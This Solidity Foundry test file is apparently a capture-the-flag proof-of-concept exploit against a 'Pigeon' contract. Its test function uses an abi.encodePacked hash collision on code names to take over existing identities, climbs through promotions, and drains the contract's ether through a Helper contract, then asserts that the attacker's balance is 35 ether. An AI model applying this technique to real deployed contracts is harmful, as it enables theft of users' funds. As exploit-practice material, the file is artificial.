// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "../src/Pigeon.sol";

contract PigeonPOC is Test {
    address public owner;
    address public attacker;

    Pigeon public pigeon;

    function setUp() public {
        vm.startPrank(owner);
        pigeon = new Pigeon();
        vm.deal(owner, 30e18);
        pigeon.assignPigeon("Numbuh", "6", address(0x006), 0);
        pigeon.assignPigeon{value: 5e18}("Numbuh", "5", address(0x005), 0);
        pigeon.assignPigeon("Numbuh", "4", address(0x004), 1);
        pigeon.assignPigeon{value: 10e18}("Numbuh", "3", address(0x003), 1);
        pigeon.assignPigeon("Numbuh", "2", address(0x002), 2);
        pigeon.assignPigeon{value: 15e18}("Numbuh", "1", address(0x001), 2);
        vm.stopPrank();
        vm.deal(attacker, 5e18);
    }

    function test_attack() external {
        vm.startPrank(attacker);

        bytes32 codeName;
        Helper helper = new Helper();
        address help = address(helper);
        (bool success,) = help.call{value: 4e18}("");
        require(success, "Transfer failed.");
        codeName = pigeon.becomeAPigeon("Numbu", "h5");
        pigeon.task(codeName, help, 4e18);

        pigeon.task(codeName, help, 4e18);

        pigeon.flyAway(codeName, 0);
        pigeon.promotion(codeName, 1, "Numbu", "h3");

        codeName = keccak256(abi.encodePacked("Numbu", "h3"));
        pigeon.task(codeName, help, 4e18);
        pigeon.task(codeName, help, 4e18);

        pigeon.task(codeName, help, 4e18);
        pigeon.flyAway(codeName, 1);
        pigeon.promotion(codeName, 2, "Numbu", "h1");

        codeName = keccak256(abi.encodePacked("Numbu", "h1"));
        pigeon.flyAway(codeName, 2);
        (success,) = help.call{value: 0}("");

        require(success, "Transfer failed.");

        vm.stopPrank();
        validate();
    }

    function validate() internal {
        assertEq(attacker.balance, 35e18);
        // Assert attacker balance is 35
    }
}

contract Helper {
    bool public toggle;
    address immutable owner;

    constructor() {
        owner = msg.sender;
    }

    fallback() external payable {
        if (msg.sender != owner) revert();
        if (!toggle) {
            toggle = true;
        } else {
            (bool success,) = owner.call{value: address(this).balance}("");

            require(success, "Transfer failed.");
        }
    }
}
